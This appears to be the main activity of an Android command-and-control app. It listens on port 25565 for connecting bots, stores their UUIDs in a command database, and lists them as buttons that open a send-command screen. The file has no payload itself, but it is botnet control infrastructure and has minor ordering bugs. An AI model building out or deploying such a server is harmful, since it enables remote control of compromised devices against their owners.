package c2.mobile.mobilec2;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;

import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {
    /**
     * Called when the activity is first created.
     */
    private static final String TAG = "ServerSocketTest";
    private CommandDatabase commandDatabase;

    Runnable conn = new Runnable() {
        public void run() {
            try {
                ServerSocket server = new ServerSocket(25565);
                while (true) {
                    Socket socket = server.accept();
                    new C2ClientThread(socket, commandDatabase).start();
                }
            } catch (Exception e) {
                Log.e(TAG, e.getMessage());
            }
        }
    };


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.e("context: ", getApplicationContext().toString());

        new Thread(conn).start();
        commandDatabase = new CommandDatabase(getApplicationContext());

        createBotList();
    }

    public void createBotList() {
        ScrollView scrollView = new ScrollView(this);
        final LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        layoutParams.setMargins(100, 25, 100, 0);
        scrollView.addView(ll);

        CommandDatabase commandDatabase = new CommandDatabase(this.getApplicationContext());
        ArrayList<String> uuids = commandDatabase.getUUIDsFromDatabase();
        for(int i = 0; i < uuids.size(); i++){
            String uuid = uuids.get(i);

            Button add_btn = new Button(this);
            add_btn.setText(uuid);
            ll.addView(add_btn, layoutParams);

            add_btn.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    Intent intent = new Intent(v.getContext(), SendCommand.class);
                    intent.putExtra("uuid", uuid);
                    startActivity(intent);
                }
            });
            this.setContentView(scrollView);
        }
    }


}
